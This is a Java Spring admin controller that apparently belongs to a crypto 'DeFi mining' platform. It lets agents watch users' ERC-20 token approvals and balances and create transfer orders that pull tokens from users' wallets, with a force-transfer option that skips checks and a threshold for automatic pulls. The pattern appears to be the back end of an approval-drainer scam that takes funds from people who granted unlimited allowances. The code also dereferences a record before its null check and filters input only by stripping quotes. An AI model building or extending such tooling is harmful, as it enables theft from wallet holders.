package com.inso.modules.admin.agent.controller.coin;

import com.inso.framework.bean.ApiJsonTemplate;
import com.inso.framework.bean.ErrorResult;
import com.inso.framework.bean.PageVo;
import com.inso.framework.bean.SystemErrorResult;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.spring.web.WebRequest;
import com.inso.framework.utils.RowPager;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.admin.agent.AgentAuthManager;
import com.inso.modules.admin.helper.AgentAccountHelper;
import com.inso.modules.coin.approve.job.ApproveNotifyMerchantJob;
import com.inso.modules.coin.approve.logical.TransferOrderManager;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.coin.approve.service.TransferOrderService;
import com.inso.modules.coin.config.CoinConfig;
import com.inso.modules.coin.contract.Token20Manager;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.core.service.CoinAccountService;
import com.inso.modules.coin.defi_mining.model.MiningProductInfo;
import com.inso.modules.coin.defi_mining.service.MiningProductService;
import com.inso.modules.coin.defi_mining.service.MiningRecordService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.common.model.Status;
import com.inso.modules.passport.UserErrorResult;
import com.inso.modules.passport.user.logical.UserQueryManager;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.model.UserInfo;
import com.inso.modules.passport.user.model.UserSecret;
import com.inso.modules.passport.user.service.UserAttrService;
import com.inso.modules.passport.user.service.UserSecretService;
import com.inso.modules.passport.user.service.UserService;
import com.inso.modules.web.service.ConfigService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.math.BigDecimal;

@Controller
@RequestMapping("/alibaba888/agent")
public class ApproveAuthController {

    private static Log LOG = LogFactory.getLog(ApproveAuthController.class);

    @Autowired
    private ConfigService mConfigService;

    @Autowired
    private UserService userService;

    @Autowired
    private UserAttrService mUserAttrService;

    @Autowired
    private UserSecretService mUserSecretService;

    @Autowired
    private ApproveAuthService mApproveAuthService;

    @Autowired
    private UserQueryManager mUserQueryManager;

    @Autowired
    private TransferOrderService mTransferOrderService;

    @Autowired
    private TransferOrderManager mTransferOrderMgr;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private AgentAuthManager mAgentAuthManager;

    @Autowired
    private MiningProductService miningProductService;

    @Autowired
    private CoinAccountService mAccountService;

    @Autowired
    private MiningRecordService miningRecordService;


    @RequestMapping("syncMiningInfo")
    @ResponseBody
    public String syncMiningInfo()
    {
        //已检查权限
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(!mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_SYSTEM);
            return apiJsonTemplate.toJSONString();
        }
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());

        String address = authInfo.getSenderAddress();

        CryptoNetworkType networkType = CryptoNetworkType.getType(contractInfo.getNetworkType());

        CryptoCurrency quoteCurrency=CryptoCurrency.getType(contractInfo.getCurrencyType());

        PageVo pageVo = new PageVo(0, 10);
        RowPager<MiningProductInfo> rowPager = miningProductService.queryScrollPage(pageVo, networkType, quoteCurrency, Status.ENABLE);
        MiningProductInfo miningProductInfo= rowPager.getList().get(0);
        if(miningProductInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
        long productId =miningProductInfo.getId();

        CoinAccountInfo accountInfo = mAccountService.findByAddress(false, address);
        if(accountInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(miningRecordService.findByAccountIdAndProductId(false, accountInfo.getUserid(), productId) != null)
        {
            // 已存在
            apiJsonTemplate.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "已存在挖矿记录!");
            return apiJsonTemplate.toJSONString();
        }


        // 判断是否授权过
        boolean isAuth = true;
        if(authInfo.getAllowance().compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) < 0)
        {
            Token20Manager token20Manager = Token20Manager.getInstance();
            BigDecimal allowance = token20Manager.allowance(networkType, contractInfo.getCurrencyCtrAddr(), address, contractInfo.getAddress(), authInfo.getApproveAddress());
            isAuth = allowance != null && allowance.compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) > 0;

            if(isAuth)
            {
                mApproveAuthService.updateInfo(authInfo, null, allowance, null, null, -1);
            }

        }

        if(isAuth)
        {
            miningRecordService.add(accountInfo, miningProductInfo);
        }


        return apiJsonTemplate.toJSONString();
    }

    @RequestMapping("getCoinScanUrl")
    @ResponseBody
    public String getCoinScanUrl(Model model, HttpServletRequest request)
    {
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));
        String type = WebRequest.getString("type");
        String key = WebRequest.getString("key");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(StringUtils.isEmpty(key) || StringUtils.isEmpty(type) || networkType == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        if("contract_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getContractScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("transaction_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getTransactionScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("account_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getAccountScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("approve_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getApproveScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
        }

        return apiJsonTemplate.toJSONString();
    }



    @RequestMapping("root_coin_crypto_approve_auth")
    public String toList(Model model, HttpServletRequest request)
    {
        String address = WebRequest.getString("address");
//        List<Game> list = mApproveAuthService.queryAllByCategory(true, GameCategory.ANDAR_BAHAR);
//        model.addAttribute("gameList", list);

        CryptoNetworkType.addFreemarkerModel(model);
        CryptoCurrency.addModel(model);

        // 1. 读取配置判断是否开启员工审核
        String isShowTransferValue = mConfigService.getValueByKey(false, CoinConfig.WITHDRAW_TRANSFER_CHECK_AGENT_STAFF_SWITCH.getKey());
        boolean isShowTransfer = isShowTransferValue.equalsIgnoreCase("enableAll") || (AgentAccountHelper.isAgentLogin() && isShowTransferValue.equalsIgnoreCase("enableAgent"));
        model.addAttribute("isShowTransfer", isShowTransfer+"");
        boolean isAgent=AgentAccountHelper.isAgentLogin();
        model.addAttribute("isAgent", isAgent);

        model.addAttribute("address", address);
        return "admin/agent/coin/coin_approve_auth_list";
    }


    @RequestMapping("getCoinApproveAuthList")
    @ResponseBody
    public String getCoinApproveAuthList()
    {
        //已检查权限
        long agentid = AgentAccountHelper.getAdminAgentid();

        String time = WebRequest.getString("time");
        String username = WebRequest.getString("username");

        String address = WebRequest.getString("address");
        long userid = mUserQueryManager.findUserid(username);

        String orderBy = WebRequest.getString("orderBy");

        CryptoCurrency currency = CryptoCurrency.getType(WebRequest.getString("currencyType"));
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));
        Status status = Status.getType(WebRequest.getString("status"));

        long contractid = WebRequest.getLong("contractid");

        ApiJsonTemplate template = new ApiJsonTemplate();
        // 没有代理无法查询
        if(agentid <= 0)
        {
            template.setData(RowPager.getEmptyRowPager());
            return template.toJSONString();
        }

        PageVo pageVo = new PageVo(WebRequest.getInt("offset"), WebRequest.getInt("limit"));
        pageVo.parseTime(time);

        String staffname = WebRequest.getString("staffname");
        long staffid = mUserQueryManager.findUserid(staffname);
        // 如果是员工登陆，则员工只能查看自己下级会员的数据
        UserInfo currentLoginInfo = AgentAccountHelper.getAdminLoginInfo();

        if(UserInfo.UserType.STAFF.getKey().equalsIgnoreCase(currentLoginInfo.getType()))
        {
            staffid = currentLoginInfo.getId();
        }
        RowPager<ApproveAuthInfo> rowPager = mApproveAuthService.queryScrollPage(pageVo, userid, address, contractid, orderBy, currency, networkType, status ,agentid ,staffid ,null);

        template.setData(rowPager);
        return template.toJSONString();
    }


    @RequestMapping("doCoinTransferBalance")
    @ResponseBody
    public String doCoinTransferBalance()
    {
        long id = WebRequest.getLong("transferFormId");
        BigDecimal transferAmount = WebRequest.getBigDecimal("transferFormAmount");
        String transferFormGoogleCode = WebRequest.getString("transferFormGoogleCode");

        boolean forceTransfer = WebRequest.getBoolean("transferFromForceTransfer");

        ApiJsonTemplate template = new ApiJsonTemplate();

        if(transferAmount.compareTo(BigDecimal.ZERO) <= 0 || id <= 0)
        {
            template.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return template.toJSONString();
        }

        if(!AgentAccountHelper.isAgentLogin())
        {
            template.setJsonResult(SystemErrorResult.ERR_SYS_OPT_FORBID);
            return template.toJSONString();
        }

        UserInfo agentInfo = AgentAccountHelper.getAdminLoginInfo();
        UserSecret userSecret = mUserSecretService.find(false, agentInfo.getName());
        if(!userSecret.checkGoogle(template, transferFormGoogleCode, false))
        {
            return template.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            template.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return template.toJSONString();
        }

        if(!mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            template.setJsonResult(SystemErrorResult.ERR_SYSTEM);
            return template.toJSONString();
        }

        UserInfo userInfo = userService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
        if(userType == UserInfo.UserType.TEST)
        {
            template.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "测试号无法划转!");
            return template.toJSONString();
        }

        UserAttr userAttr = mUserAttrService.find(false, authInfo.getUserid());
        if(!forceTransfer && !authInfo.verifyTransfer(transferAmount))
        {
            template.setJsonResult(UserErrorResult.ERR_PAY_NOT_ENOUGH_BALANCE);
            return template.toJSONString();
        }

        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());

        // 创建订单
        ErrorResult result = mTransferOrderMgr.createOrder(userAttr, contractInfo, authInfo, transferAmount, TriggerOperatorType.Agent);
        template.setJsonResult(result);

        return template.toJSONString();
    }



    @RequestMapping("syncCoinApproveInfo")
    @ResponseBody
    public String syncCoinApproveInfo()
    {
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }
//        LOG.info(" authInfo info = " + FastJsonHelper.jsonEncode(authInfo));

        ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());
        if(!mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            return apiJsonTemplate.toJSONString();
        }
//        LOG.info(" contract info = " + FastJsonHelper.jsonEncode(contractInfo));
        UserInfo userInfo = userService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());

        CryptoNetworkType networkType = CryptoNetworkType.getType(contractInfo.getNetworkType());
        CryptoCurrency currency = CryptoCurrency.getType(contractInfo.getCurrencyType());
        String address = authInfo.getSenderAddress();

        Token20Manager token20Manager = Token20Manager.getInstance();
        BigDecimal balance = null;
        if(userType != UserInfo.UserType.TEST)
        {
            balance = token20Manager.balanceOf(networkType, contractInfo.getCurrencyCtrAddr(), address);
        }
        BigDecimal allowance = token20Manager.allowance(networkType, contractInfo.getCurrencyCtrAddr(), address, contractInfo.getAddress(), authInfo.getApproveAddress());

        if(balance == null || balance.compareTo(authInfo.getBalance()) == 0)
        {
            balance = null;
        }

        if(allowance == null || allowance.compareTo(authInfo.getAllowance()) == 0)
        {
            allowance = null;
        }

        if(balance != null || allowance != null)
        {
            int approveCount = token20Manager.getApproveCount(address, networkType, currency);
            mApproveAuthService.updateInfo(authInfo, balance, allowance, null, null, approveCount);
            ApproveNotifyMerchantJob.sendMQ(authInfo);
        }
        return apiJsonTemplate.toJSONString();
    }

    @RequestMapping("updateCoinApproveAssertWalletBalance")
    @ResponseBody
    public String updateCoinApproveAssertWalletBalance()
    {
        long id = WebRequest.getLong("id");
        BigDecimal walletAmount = WebRequest.getBigDecimal("walletAmount");
        BigDecimal monitorMinTransferAmount = WebRequest.getBigDecimal("monitorMinTransferAmount");

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        if(walletAmount == null || walletAmount.compareTo(BigDecimal.ZERO) < 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(!mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            return apiJsonTemplate.toJSONString();
        }

        CryptoNetworkType networkType = CryptoNetworkType.getType(authInfo.getCtrNetworkType());

        UserInfo userInfo = userService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
        if(userType == UserInfo.UserType.TEST)
        {
            monitorMinTransferAmount = null;
            authInfo.setUserType(userType.getKey());
        }
        else
        {
            walletAmount = null;

            if(networkType != CryptoNetworkType.ETH_MAINNET)
            {
                apiJsonTemplate.setError(-1, "监控划转金额只支持 ETH 链!");
                return apiJsonTemplate.toJSONString();
            }

            if(monitorMinTransferAmount == null)
            {
                apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
                return apiJsonTemplate.toJSONString();
            }

            if(!authInfo.verifyTransfer(monitorMinTransferAmount))
            {
                apiJsonTemplate.setError(-1, "监控划转金额不能小于配置最低余额!");
//                apiJsonTemplate.setJsonResult(UserErrorResult.ERR_PAY_NOT_ENOUGH_BALANCE);
                return apiJsonTemplate.toJSONString();
            }

        }


        mApproveAuthService.updateInfo(authInfo, walletAmount, null, monitorMinTransferAmount,null, -1);
        return apiJsonTemplate.toJSONString();
    }


    @RequestMapping("updateCoinApproveRemark")
    @ResponseBody
    public String updateCoinApproveRemark()
    {
        long id = WebRequest.getLong("id");
        String remark = WebRequest.getString("remark");

        remark = StringUtils.getNotEmpty(remark);
        remark = remark.replace("'", "");

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ApproveAuthInfo authInfo = mApproveAuthService.findById(id);
        if(authInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(!mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            return apiJsonTemplate.toJSONString();
        }

        mApproveAuthService.updateRemark(authInfo, remark);
        return apiJsonTemplate.toJSONString();
    }

}
